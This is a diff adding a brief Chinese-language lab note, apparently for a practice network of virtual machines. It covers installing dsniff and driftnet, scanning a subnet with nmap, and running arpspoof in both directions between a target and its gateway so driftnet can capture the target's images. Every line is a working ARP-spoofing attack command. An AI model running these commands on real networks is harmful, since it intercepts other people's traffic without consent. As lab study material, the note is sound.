@@ -1,0 +1,31 @@
+攻击机 192.168.241.140  00:0c:29:7d:2d:2a
+目标机 192.168.241.133  00:0c:29:f2:11:12  
+网关 192.168.241.2  00:50:56:f8:d2:2d
+
+安装工具arpspoof
+cd /etc/apt
+apt-get update
+apt-get install -y dsniff ssldump
+
+安装工具driftent
+apt-get install -y driftnet
+
+攻击机信息收集：
+ifconfig     //ip配置
+ip route show    //网关
+arp -a   //查看arp信息
+
+
+nmap -T4 -A -v -Pn 192.168.241.0/24
+
+ping 192.168.241.133
+
+arp -a
+
+arpspoof -t 192.168.241.2 192.168.241.133 -i eth0
+
+arpspoof -t 192.168.241.133 192.168.241.2 -i eth0
+driftnet -i eth0
+
+
+
